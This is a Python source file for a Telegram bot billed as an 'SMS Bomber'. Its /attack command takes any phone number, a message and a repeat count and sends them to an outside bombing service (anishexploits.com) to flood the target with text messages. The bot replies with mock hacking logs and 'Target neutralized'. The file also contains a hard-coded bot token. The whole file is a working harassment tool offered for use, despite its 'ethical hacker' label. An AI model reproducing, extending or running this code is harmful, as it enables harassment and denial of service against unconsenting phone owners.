import requests
import os
import sys
import time
import random
import telebot
from telebot import types

# ============ CONFIG ============
API_URL = "https://anishexploits.com/bomber/custom-sms.php"
OWNER   = "SUMIT"
TELEGRAM_BOT_TOKEN = "8958289792:AAEl79ui_MvWzwFZZp1v9O8IhdaPV_1lgNQ" # Yahan apna bot token dalein

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# ============ UTILS ============
def fake_hack_sequence():
    logs = [
        "Bypassing firewall...",
        "Injecting payload...",
        "Connecting to server...",
        "Decrypting API key...",
        "Verifying credentials...",
        "Escalating privileges...",
        "Establishing secure tunnel...",
        "Spoofing MAC address...",
        "Routing through 7 proxies...",
        "Access granted ✔",
    ]
    for log in logs:
        time.sleep(0.2)

# ============ KEYBOARD ============
def main_menu_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn_about = types.KeyboardButton("👤 About")
    btn_help = types.KeyboardButton("ℹ️ Help / Format")
    markup.add(btn_about, btn_help)
    return markup

# ============ TELEGRAM HANDLERS ============

@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = (
        f"⚡ *THE SMS BOMBER v2.0* ⚡\n"
        f"Powered by @{OWNER}\n\n"
        f"Welcome, {message.from_user.first_name}!\n"
        f"Neeche diye gaye buttons ka use karein ya command bhejein.\n\n"
        f"Attack ke liye type karein:\n`/attack <phone> <message> <count>`"
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=main_menu_keyboard())

@bot.message_handler(func=lambda message: message.text == "👤 About")
def handle_about(message):
    about_text = (
        f"👤 *Name*: {OWNER}\n"
        f"💻 *Role*: Ethical Hacker\n"
        f"🛠 *Tool*: SMS Bomber v2.0\n"
        f"⚡ *Status*: ONLINE\n"
        f"🔥 *Motto*: Hack the world, ethically."
    )
    bot.reply_to(message, about_text, parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == "ℹ️ Help / Format")
def handle_help(message):
    help_text = (
        "📌 *How to use Attack:*\n\n"
        "Aapko chat mein yeh format type karke bhejna hoga:\n"
        "`/attack 9876543210 Hello 5`\n\n"
        "Format: `/attack <phone> <message> <count>`"
    )
    bot.reply_to(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['about'])
def send_about_cmd(message):
    handle_about(message)

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    try:
        parts = message.text.split(maxsplit=3)
        if len(parts) < 4:
            bot.reply_to(message, "❌ *Invalid format!*\nUse: `/attack <phone> <message> <count>`", parse_mode="Markdown")
            return

        phone = parts[1]
        sms = parts[2]
        count_in = parts[3]

        if not phone.isdigit() or len(phone) < 10:
            bot.reply_to(message, "❌ Invalid number! Only digits, min 10.")
            return

        count = int(count_in) if count_in.isdigit() and int(count_in) > 0 else 1

        bot.reply_to(message, f"⚡ Launching attack on {phone}...")
        fake_hack_sequence()

        params = {"phone": phone, "sms": sms, "count": count}
        r = requests.get(API_URL, params=params, timeout=60)
        data = r.json()

        if data.get("status") == "success":
            res = data.get("result", {})
            sent    = res.get("sent", 0)
            failed  = res.get("failed", 0)
            time_ms = res.get("time_ms", 0)
            speed   = res.get("speed", "N/A")

            result_text = (
                f"✔ *ATTACK SUCCESSFUL*\n\n"
                f"📤 Sent      : {sent}\n"
                f"❌ Failed    : {failed}\n"
                f"⏱  Time      : {time_ms} ms\n"
                f"⚡ Speed     : {speed}\n"
                f"🏷  Brand     : {data.get('brand', 'N/A')}\n\n"
                f"Target neutralized. Good job, {OWNER}!"
            )
            bot.reply_to(message, result_text, parse_mode="Markdown")
        else:
            msg = data.get("message", str(data))
            code = data.get("code", "?")
            bot.reply_to(message, f"❌ Failed ({code}): {msg}")

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

# ============ MAIN ============
if __name__ == "__main__":
    print(f"[*] Telegram Bot started as {OWNER}...")
    bot.infinity_polling()
